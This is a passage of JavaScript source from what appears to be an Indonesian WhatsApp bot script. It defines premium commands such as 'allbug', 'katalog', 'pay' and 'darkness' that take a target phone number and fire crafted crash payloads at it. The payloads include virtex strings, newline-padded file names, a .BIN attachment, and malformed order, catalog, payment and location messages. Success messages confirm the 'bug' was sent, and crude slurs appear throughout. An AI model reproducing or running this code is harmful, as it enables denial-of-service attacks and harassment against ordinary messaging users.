⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
lexx.sendMessage(Pe, {text: `${titid} ${bugsw}`}, {quoted: vtext})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${ngazap(prefix)}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${buttonvirus}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${buttonkal}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${virtex2}`}, {quoted: vtext})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${virtex3}`}, {quoted: vtext})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${place}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${virtex}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${vipi}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${iphone5}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${iphone1}`}, {quoted: vkatalog})
await sleep(1000)
lexx.sendMessage(Pe, {text: `${titid} ${iphone2}`}, {quoted: vkatalog})
reply(`Sukses Mengirimkan AllVirtex Kepada @${q}`)
}
break
case 'allbug': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 6282328482747`)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var bongdy = await axios.get(`https://waifu.pics/api/nsfw/neko`)
var bongdynya = {
image: {url:bongdy.data.url},
caption: `${virtex2}${buttonkal}`,
} 
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/kaze.jpeg') }, { upload: lexx.waUploadToServer })
var anuin = fs.readFileSync('./virtex/ngeselin.BIN')
var titid = `PELER
⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⢉⢉⠉⠉⠻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠠⡰⣕⣗⣷⣧⣀⣅⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠃⣠⣳⣟⣿⣿⣷⣿⡿⣜⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠁⠄⣳⢷⣿⣿⣿⣿⡿⣝⠖⠄⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⢢⡹⣿⢷⣯⢿⢷⡫⣗⠍⢰⣿⣿⣿⣿⣿
⣿⣿⣿⡏⢀⢄⠤⣁⠋⠿⣗⣟⡯⡏⢎⠁⢸⣿⣿⣿⣿⣿
⣿⣿⣿⠄⢔⢕⣯⣿⣿⡲⡤⡄⡤⠄⡀⢠⣿⣿⣿⣿⣿⣿
⣿⣿⠇⠠⡳⣯⣿⣿⣾⢵⣫⢎⢎⠆⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢨⣫⣿⣿⡿⣿⣻⢎⡗⡕⡅⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢜⢾⣾⣿⣿⣟⣗⢯⡪⡳⡀⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠄⢸⢽⣿⣷⣿⣻⡮⡧⡳⡱⡁⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡄⢨⣻⣽⣿⣟⣿⣞⣗⡽⡸⡐⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⢀⢗⣿⣿⣿⣿⡿⣞⡵⡣⣊⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡀⡣⣗⣿⣿⣿⣿⣯⡯⡺⣼⠎⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣧⠐⡵⣻⣟⣯⣿⣷⣟⣝⢞⡿⢹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡆⢘⡺⣽⢿⣻⣿⣗⡷⣹⢩⢃⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⠄⠪⣯⣟⣿⢯⣿⣻⣜⢎⢆⠜⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⠄⢣⣻⣽⣿⣿⣟⣾⡮⡺⡸⠸⣿⣿⣿⣿
⣿⣿⡿⠛⠉⠁⠄⢕⡳⣽⡾⣿⢽⣯⡿⣮⢚⣅⠹⣿⣿⣿
⡿⠋⠄⠄⠄⠄⢀⠒⠝⣞⢿⡿⣿⣽⢿⡽⣧⣳⡅⠌⠻⣿
⠁⠄⠄⠄⠄⠄⠐⡐⠱⡱⣻⡻⣝⣮⣟⣿⣻⣟⣻⡺⣊
`
var contact = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"contactMessage": {
"displayName": `© WANGSAF ${virkon1} ${ngazap(prefix)}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ${virkon1}\nitem1.TEL;waid=6281216465289:+62 812-1646-5289\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:Developer © NYX WhatsApp / Script Bot ORDER ? CHAT AJA 👋\nX-WA-BIZ-NAME:© YTTA\nEND:VCARD`,
}
}), { userJid: msg.chat, quoted: vkatalog })
var vcarrd = `BEGIN:VCARD\n` 
+ `VERSION:3.0\n` 
+ `FN:${virkon1}\n`
+ `ORG:;\n`
+ `TEL;type=CELL;type=VOICE;waid=6281216465289:+62 812-1646-5289\n`
+ `END:VCARD`
var web = generateWAMessageFromContent(Pe, {
"extendedTextMessage": {
"text": `${virtex3}${virtex2}`,
"matchedText": "https://instagram.com/hikal_857",
"description": "Undangan Grup WhatsApp",
"title": `𝐶𝑅𝐴𝑆𝐻 𝐷𝐸𝐶𝐾?🥵-${buttonkal}`,
"previewType": "NONE",
"contextInfo": {
"externalAdReply": {
"showAdAttribution": true,
}}
}
}, {quoted: vtroli, contextInfo:{}})
var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({ "groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME NYX WANGSAP ${ngazap(prefix)}`,
"groupName": `MY NAME NYX WANGSAP ${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: msg.chat, quoted:msg})
var liveLocation = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© NYX WANGSAP ${ngazap(prefix)}${virtex3}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: msg.chat, quoted:vkatalog})
var touchmebre = [
{
title: `🌷 NYX WANGSAP  WA 🌷 ${buttonvirus} ${buttonkal}`,
rows: [
{title: place, rowId: `asu'+$+$+$+2+#`, description: `WASU`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod`}
]
}
]
var order = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": ppnyauser,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${place} ${virtex2}`,
"orderTitle": `${buttonkal} ${virtex3}`, // 
"sellerJid": "6281216465289@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: msg.chat, quoted:vtext})
var catalog = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": ppnyauser,
"title": `FIRJA X HAIKAL${buttonkal}${bugsw}`,
"description": `${buttonkal}`,
"currencyCode": "IDR",
"footerText": `Kesian Awokawok:v`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `${bugsw}`,
"bodyText": 'YTTA',
"url": "Wa.me/6281216465289"
},
"businessOwnerJid": "6281216465289@s.whatsapp.net",
}
}), { userJid: msg.chat, quoted: vtext })
var document = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Darkness メ ️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}${place}${virtex3}${virtex2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileLength": "112000",
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: msg.chat, quoted: vtext })
lexx.sendMessage(Pe, { 
text: 'Bug Mainan Awokawok', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
{ urlButton: { displayText: `OWNER`, url: 'https://wa.me/6281216465289'}},
{ urlButton: { displayText: `ID GORUP`, url: 'https://www.whatsapp.com/otp/copy/'}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `sewa`}},
], 
 })
await sleep(1000)
lexx.sendListMsg(Pe, `🌷 NYX WANGSAP  WA 🌷`, lexx.user.name, `Hay Kak Sc Bot Ada Di List`, `Click Here 🌷`, touchmebre, msg)
await sleep(1000)
lexx.relayMessage(Pe, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal} ${virtex2} `, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC NYX WANGSAP `,"body": `Selamat ${ucapanWaktu} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${buttonvirus}`,
showAdAttribution: true,
sourceUrl: `https://github.com/NYX095`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:vtext})
await sleep(1000)
lexx.sendMessage(Pe, { text: `${virtex3}${buttonkal}`, contextInfo: { "externalAdReply": { "title": `${virtex2} ${buttonkal}`, "body": `©  ${ngazap(prefix)}`, "previewType": "PHOTO", "thumbnailUrl": `https://github.com/NYX095`, "thumbnail": thumb, "sourceUrl": `https://github.com/NYX095` } } }, { quoted: vtext })
await sleep(1000)
lexx.relayMessage(Pe, web.message, { messageId: web.key.id })
await sleep(1000)
lexx.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
lexx.relayMessage(Pe, document.message, { messageId: document.key.id })
await sleep(1000)
lexx.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(1000)
lexx.sendMessage(Pe, { document: anuin, mimetype: 'application/octet-stream', fileName: `KONTOL INFINITY ${place}.BIN`, title: `𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘.BIN` }, { quoted: vtext })
await sleep(1000)
lexx.relayMessage(Pe, order.message, { messageId: order.key.id })
await sleep(1000)
lexx.relayMessage(Pe, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
lexx.sendMessage(Pe, { contacts: { displayName: `${ngazap(prefix)}`, contacts: [{ vcarrd }] }, mentions : vtext ? vtext : []},{ quoted: vkatalog })
await sleep(1000)
lexx.relayMessage(Pe, contact.message, { messageId: contact.key.id })
lexx.sendMessage(Pe, {text: `${titid} ${bugsw}`}, {quoted: vtext})
reply(`Sukses Mengirim AllBug Kepada @${q} \n Mohon pakai fitur ini sejam sekali karna sangat rawan banned`)
}
break
case 'troli': 
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 628232848274`)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `©${setting.ownerName}`,jpegThumbnail: fs.readFileSync('./image/kaze.jpeg')}}}
var order = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": ppnyauser,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${place} ${virtex2}`,
"orderTitle": ` ${iphone1}`, // 
"sellerJid": "6281216465289@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: msg.chat, quoted:vkatalog})
lexx.relayMessage(Pe, order.message, { messageId: order.key.id })
break
case 'buttonlist':
if (!isPremium) return reply(OnlyPrem)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var touchmebre = [
{
title: `🌷 ${botName} 🌷 ${buttonvirus} ${buttonkal}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `YTTA ${place}`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Hay Anak" Ngentod ${buttonkal}`}
]
}
]
lexx.sendListMsg(Pe, `🌷 NYX WANGSAP  WA 🌷`, lexx.user.name, `Hay Kak Sc Bot Ada Di List`, `Click Here 🌷`, touchmebre, vtext)
break
case 'loc': 
if (!isPremium) return reply(OnlyPrem)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/kaze.jpeg') }, { upload: lexx.waUploadToServer })
var liveLocation = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© NYX WANGSAP ${ngazap(prefix)}${virtex3}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: msg.chat, quoted:msg})
lexx.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'katalogv2': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/loli3.jpeg') }, { upload: lexx.waUploadToServer })
var catalog = generateWAMessageFromContent(teks, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": ppnyauser,
"title": `NYX KURANG MAKER😱${place}${virtex2}`,
"description": `${place}${virtex3}️`,
"currencyCode": "USD",
"footerText": `Kesian Awokawok:v`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `${bugsw}`,
"bodyText": 'YTTA',
"url": "Wa.me/6281216465289"
},
"businessOwnerJid": "6281216465289@s.whatsapp.net",
}
}), { userJid: msg.chat, quoted: vtroli })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
}
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'katalog': {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./image/kaze.jpeg') }, { upload: lexx.waUploadToServer })
var catalog = generateWAMessageFromContent(teks, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": ppnyauser,
"title": `FIRJA X HAIKAL${buttonkal}${bugsw}`,
"description": `${bugsw}${buttonkal}️`,
"currencyCode": "IDR",
"footerText": `Kesian Awokawok:v`,
"productImageCount": 1,
"firstImageId": 1,
"retailerId": `${bugsw}`,
"bodyText": 'YTTA',
"url": "Wa.me/6281216465289"
},
"businessOwnerJid": "6281216465289@s.whatsapp.net",
}
}), { userJid: msg.chat, quoted: vtext })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
lexx.relayMessage(teks, catalog.message, { messageId: catalog.key.id })
}
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'pay' : {
if (!isPremium) return reply(OnlyPrem)
if (!q) return reply(`#Example: ${prefix+command} Nomor\nContoh: ${prefix+command} 6282748274828`)
var teks = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
lexx.relayMessage(teks, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal} ${buttonvirus} `, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC NYX WANGSAP `,"body": `Selamat ${ucapanWaktu} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `🔥 ${buttonvirus} ${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://github.com/NYX095`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:vtext})
}
reply(`Sukses Mengirimkan Bug Kepada @${q} !`)
break
case 'darkness': 
 if (!isPremium) return reply(OnlyPrem)
 if (!q) return reply(`#Example : ${prefix+command} 62xxx\n Contoh : ${prefix+command} 6282328482747`)
var Pe = mengsplit.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
var document = generateWAMessageFromContent(Pe, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "Darkness メ",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `Darkness メ ️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\